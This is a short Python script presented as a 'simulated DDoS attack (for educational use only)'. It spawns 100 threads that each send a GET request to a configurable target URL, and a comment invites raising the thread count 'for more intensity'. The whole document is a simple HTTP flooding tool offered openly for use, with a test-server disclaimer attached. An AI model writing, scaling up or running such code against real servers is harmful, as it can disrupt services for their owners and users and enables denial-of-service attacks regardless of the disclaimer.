import threading
import requests

# Target website (Use a test server!)
TARGET_URL = "http://your-test-server.com"  # Change to your own test server

# Number of requests to send
THREAD_COUNT = 100  # Increase for more intensity

def send_request():
    try:
        response = requests.get(TARGET_URL)
        print(f"Sent request | Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

def start_attack():
    threads = []
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print("🚀 Starting simulated DDoS attack (for educational use only)...")
    start_attack()
